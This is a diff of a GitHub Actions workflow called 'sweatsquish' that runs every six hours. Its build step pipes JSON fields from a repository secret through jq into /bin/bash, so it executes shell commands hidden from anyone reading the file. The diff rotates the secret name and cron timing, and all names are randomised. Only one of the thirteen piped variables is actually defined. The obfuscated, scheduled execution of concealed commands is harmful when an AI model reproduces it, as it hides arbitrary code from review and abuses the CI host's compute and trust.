@@ -1,8 +1,9 @@
 name: sweatsquish
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '54 5/6 * * *'
+    - cron: '16 4/6 * * *'
 
 jobs:
   build:
@@ -12,22 +13,19 @@ jobs:
       - uses: actions/checkout@v4
       - name: sweatsquish
         env:
-          kca1: ${{ secrets.kca1 }}
+          nk0: ${{ secrets.nk0 }}
         run: |
-          echo $kca1 | jq -r .casj25 | /bin/bash
-          echo $hwl81038 | jq -r .rtt24309 | /bin/bash
-          echo $qsv404 | jq -r .qkv58645 | /bin/bash
-          echo $p3048 | jq -r .sf165 | /bin/bash
-          echo $zn695 | jq -r .wz3530 | /bin/bash
-          echo $n77 | jq -r .hyavf66173 | /bin/bash
-          echo $u60 | jq -r .bsqdc4191 | /bin/bash
-          echo $uwvub441 | jq -r .x56366 | /bin/bash
-          echo $ff0 | jq -r .wfnrn33 | /bin/bash
-          echo $v6 | jq -r .bzb422 | /bin/bash
-          echo $xfwvn556 | jq -r .bk639 | /bin/bash
-          echo $yfoh19101 | jq -r .dan0 | /bin/bash
-          echo $vx2778 | jq -r .x9886 | /bin/bash
-          echo $qvszr9 | jq -r .neu272 | /bin/bash
-          echo $oesw252 | jq -r .ii085 | /bin/bash
-          echo $o4751 | jq -r .fzsav4 | /bin/bash
+          echo $nk0 | jq -r .shz76 | /bin/bash
+          echo $x80 | jq -r .nidvr8 | /bin/bash
+          echo $ftw93172 | jq -r .j702 | /bin/bash
+          echo $avp474 | jq -r .jfzc35 | /bin/bash
+          echo $pt89 | jq -r .qrthm4 | /bin/bash
+          echo $l5 | jq -r .tm10 | /bin/bash
+          echo $ubgkc5043 | jq -r .t1806 | /bin/bash
+          echo $lucej4346 | jq -r .shmi3 | /bin/bash
+          echo $vg37 | jq -r .ztneq14 | /bin/bash
+          echo $bjvxr043 | jq -r .ag54251 | /bin/bash
+          echo $zjulu923 | jq -r .sdw1 | /bin/bash
+          echo $olie2470 | jq -r .ef22 | /bin/bash
+          echo $nnf5768 | jq -r .wud9 | /bin/bash
 
